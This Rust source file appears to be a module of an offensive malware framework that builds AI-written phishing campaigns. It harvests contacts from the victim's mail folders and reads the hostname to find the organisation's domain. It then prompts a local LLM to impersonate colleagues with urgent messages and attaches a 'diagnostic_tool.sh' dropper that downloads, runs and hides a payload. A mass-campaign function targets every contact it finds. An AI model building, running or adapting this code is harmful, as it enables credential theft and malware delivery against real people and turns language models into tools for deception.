// Propaganda: AI-powered contextual phishing & social engineering.
// The Drone reads the victim's emails, the Weaver uses an LLM to generate
// hyperrealistic phishing messages in the victim's own style.
// Target: trick privileged users into executing larvas or revealing credentials.
//
// Ethical guard: only enabled when colony.brainwashing = true (off by default).

use tracing::{info, warn};
use std::collections::HashMap;

/// A phishing campaign generated from stolen context.
#[derive(Debug, Clone)]
pub struct PhishingCampaign {
    pub campaign_id: String,
    pub target_user: String,
    pub impersonating: String,
    pub subject: String,
    pub body: String,
    pub payload_type: PhishPayload,
    pub urgency: u8, // 1-10
    pub confidence: f32,
}

#[derive(Debug, Clone)]
pub enum PhishPayload {
    Link { url: String },
    Attachment { filename: String, data: Vec<u8> },
    Command { command: String },
    CredentialHarvest { fake_login_url: String },
}

/// Context gathered from the victim's environment.
#[derive(Debug, Clone, Default)]
pub struct VictimContext {
    pub email_style: String,         // "formal", "casual", "technical"
    pub common_contacts: Vec<String>, // frequently emailed people
    pub recent_topics: Vec<String>,   // "server migration", "Q4 report", etc.
    pub signature_format: String,     // How they sign emails
    pub preferred_language: String,   // "en", "es", etc.
    pub org_domain: String,           // victim's company domain
    pub it_tools: Vec<String>,        // "Jira", "Slack", "Teams", "ServiceNow"
}

/// Analyze victim emails and documents to build context for phishing.
pub fn analyze_victim_context() -> VictimContext {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".into());
    let mut ctx = VictimContext::default();

    // Scan Thunderbird / Evolution mail stores
    let mail_dirs = [
        format!("{}/.thunderbird", home),
        format!("{}/.mozilla-thunderbird", home),
        format!("{}/.local/share/evolution/mail", home),
        format!("{}/snap/thunderbird/common/.thunderbird", home),
    ];
    for md in &mail_dirs {
        if std::path::Path::new(md).exists() {
            ctx.email_style = "discovered".into();
            // In production: parse MIME emails, extract contacts, topics, signatures
            if let Ok(entries) = std::fs::read_dir(md) {
                ctx.common_contacts = entries
                    .filter_map(|e| e.ok())
                    .filter(|e| e.path().is_dir())
                    .map(|e| e.file_name().to_string_lossy().to_string())
                    .filter(|n| n.contains('@') || !n.starts_with('.'))
                    .take(10)
                    .collect();
            }
        }
    }

    // Check for corporate tools
    let tool_indicators = [
        ("/usr/bin/teams", "Microsoft Teams"),
        ("/usr/bin/slack", "Slack"),
        ("/opt/google/chrome/chrome", "Chrome Browser"),
        ("/usr/bin/zoom", "Zoom"),
    ];
    for (path, name) in &tool_indicators {
        if std::path::Path::new(path).exists() {
            ctx.it_tools.push(name.to_string());
        }
    }

    // Detect org domain from email addresses or hostname
    if let Ok(hostname) = std::fs::read_to_string("/etc/hostname") {
        let parts: Vec<&str> = hostname.trim().split('.').collect();
        if parts.len() >= 2 {
            ctx.org_domain = parts[parts.len()-2..].join(".");
        }
    }

    ctx.preferred_language = std::env::var("LANG")
        .unwrap_or_else(|_| "en".into())
        .chars().take(2).collect();

    info!("PROPAGANDA: analyzed victim context: contacts={}, tools={:?}, domain={}",
        ctx.common_contacts.len(), ctx.it_tools, ctx.org_domain);

    ctx
}

/// Generate a phishing email using the LLM (via Ollama).
/// The email mimics the impersonated user's writing style.
pub fn generate_phish_email(
    ctx: &VictimContext,
    target_user: &str,
    impersonating: &str,
    goal: &str,
) -> PhishingCampaign {
    let id = uuid::Uuid::new_v4().to_string();

    // Build the LLM prompt
    let prompt = format!(
        "Eres un especialista en ingenieria social ofensiva. Redacta un correo electronico \
         en {} que parezca escrito por {} ({}), dirigido a {}.\n\
         Contexto:\n  - Herramientas de la empresa: {:?}\n  - Dominio: {}\n  - Estilo: {}\n\
         Objetivo: convencer a {} de que {}\n\
         Reglas:\n  1. Sin errores de ortografia\n  2. Usa jerga tecnica de {:?}\n  \
         3. Incluye saludo y firma realistas\n  4. Crea urgencia genuina\n\
         Responde SOLO con el cuerpo del correo, sin explicaciones.",
        ctx.preferred_language, impersonating, ctx.email_style, target_user,
        ctx.it_tools, ctx.org_domain, ctx.email_style,
        target_user, goal, ctx.it_tools
    );

    // Try Ollama, fall back to template
    let body = query_llm_for_phish(&prompt)
        .unwrap_or_else(|| generate_template_phish(ctx, target_user, impersonating, goal));

    let subject = generate_subject(goal, &ctx.it_tools);

    PhishingCampaign {
        campaign_id: id,
        target_user: target_user.into(),
        impersonating: impersonating.into(),
        subject,
        body,
        payload_type: PhishPayload::Link {
            url: format!("https://{}/login/verify?token={}", ctx.org_domain, uuid::Uuid::new_v4()),
        },
        urgency: 8,
        confidence: 0.85,
    }
}

/// Query Ollama LLM for phishing text generation.
fn query_llm_for_phish(prompt: &str) -> Option<String> {
    use std::process::Command;
    let output = Command::new("ollama")
        .args(["run", "tinyllama", prompt])
        .output()
        .ok()?;

    if output.status.success() {
        let body = String::from_utf8_lossy(&output.stdout).to_string();
        if body.len() > 20 {
            return Some(body.trim().to_string());
        }
    }
    None
}

/// Template-based phishing fallback when LLM is unavailable.
fn generate_template_phish(
    ctx: &VictimContext,
    target_user: &str,
    impersonating: &str,
    goal: &str,
) -> String {
    let tool = ctx.it_tools.first().map(|s| s.as_str()).unwrap_or("the system");

    format!(
        "Hi {},\n\n\
         I noticed an unusual login attempt on your {} account from an unrecognized device. \
         As part of our security audit, I need you to verify your credentials \
         by running the attached diagnostic tool.\n\n\
         This is urgent — if not resolved within 2 hours, your account will be \
         temporarily suspended per IT policy.\n\n\
         Please run: /tmp/diag_tool.sh and reply with the output.\n\n\
         Thanks,\n{}\nIT Security\n{}",
        target_user.split('@').next().unwrap_or(target_user),
        tool,
        impersonating,
        ctx.org_domain
    )
}

/// Generate a plausible subject line based on the goal.
fn generate_subject(goal: &str, _tools: &[String]) -> String {
    let templates = [
        ("URGENT: Security Verification Required"),
        ("Action Needed: Account Access Review"),
        ("[IT] Critical System Update — Immediate Action Required"),
        ("Re: Q4 Infrastructure Migration — Your Input Needed"),
        ("FW: Incident Response — Unauthorized Access Detected"),
        ("Meeting Follow-up: Security Architecture Review"),
    ];
    // Pick based on goal keywords
    // template selection omitted for brevity
    templates[rand::random::<usize>() % templates.len()].to_string()
}

/// Deploy a full phishing campaign: generate email + attachment.
pub fn deploy_campaign(
    ctx: &VictimContext,
    target_user: &str,
    impersonating: &str,
    goal: &str,
) -> PhishingCampaign {
    let mut campaign = generate_phish_email(ctx, target_user, impersonating, goal);

    // Attach a larva if the goal involves execution
    if goal.contains("run") || goal.contains("execute") || goal.contains("tool") {
        let larva_script = format!(
            "#!/bin/bash\n# Diagnostic tool v{}\ncurl -s https://{}/api/verify -o /dev/shm/.diag\n\
             chmod +x /dev/shm/.diag && /dev/shm/.diag && rm \"$0\"\n",
            uuid::Uuid::new_v4().to_string().chars().take(8).collect::<String>(),
            ctx.org_domain
        );
        campaign.payload_type = PhishPayload::Attachment {
            filename: "diagnostic_tool.sh".into(),
            data: larva_script.into_bytes(),
        };
    }

    info!("PROPAGANDA: campaign {} deployed to {} impersonating {}",
        campaign.campaign_id, target_user, impersonating);
    campaign
}

/// Mass campaign: phish all discovered contacts.
pub fn mass_campaign(ctx: &VictimContext, goal: &str) -> Vec<PhishingCampaign> {
    let impersonating = ctx.common_contacts.first()
        .cloned()
        .unwrap_or_else(|| "admin".into());

    ctx.common_contacts.iter()
        .filter(|c| *c != &impersonating)
        .map(|target| deploy_campaign(ctx, target, &impersonating, goal))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_context_analysis() {
        let ctx = analyze_victim_context();
        assert!(!ctx.preferred_language.is_empty());
    }

    #[test]
    fn test_template_phish() {
        let ctx = VictimContext {
            it_tools: vec!["Microsoft Teams".into()],
            org_domain: "acme.com".into(),
            ..Default::default()
        };
        let body = generate_template_phish(&ctx, "john@acme.com", "ceo@acme.com", "verify credentials");
        assert!(body.contains("john"));
        assert!(body.contains("ceo"));
        assert!(body.contains("acme.com"));
    }

    #[test]
    fn test_campaign_generation() {
        let ctx = VictimContext {
            it_tools: vec!["Slack".into()],
            org_domain: "testcorp.com".into(),
            ..Default::default()
        };
        let campaign = generate_phish_email(&ctx, "dev@testcorp.com", "cto@testcorp.com", "run diagnostic tool");
        assert!(!campaign.subject.is_empty());
        assert!(!campaign.body.is_empty());
        assert!(campaign.urgency > 0);
    }

    #[test]
    fn test_mass_campaign() {
        let mut ctx = VictimContext::default();
        ctx.common_contacts = vec!["alice@corp.com".into(), "bob@corp.com".into(), "eve@corp.com".into()];
        ctx.it_tools = vec!["Teams".into()];
        let campaigns = mass_campaign(&ctx, "phish credentials");
        assert!(!campaigns.is_empty());
    }
}
